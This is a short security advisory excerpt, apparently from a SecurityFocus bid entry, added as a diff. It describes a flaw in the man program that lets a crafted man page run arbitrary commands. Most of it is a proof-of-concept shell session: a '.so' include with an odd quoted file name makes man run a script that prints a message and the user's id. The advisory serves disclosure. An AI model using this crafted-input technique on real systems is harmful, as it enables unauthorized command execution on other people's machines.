@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/7066/info
+
+It has been reported that the man program does not properly handle some types of input. When a man page is processed that could pose a potential security risk, the program reacts in a way that may open a window of opportunity for an attacker to execute arbitrary commands.
+
+$ cat innocent.1
+.so "".1
+$ cat '"".1' # the outer '' quotes are for the shell
+the user will never see this
+$ cat `which unsafe`
+#!/bin/sh
+
+echo "oops"
+id -a
+$ man ./innocent.1
+oops
+uid=528(lloyd) gid=100(users) groups=100(users)
+$
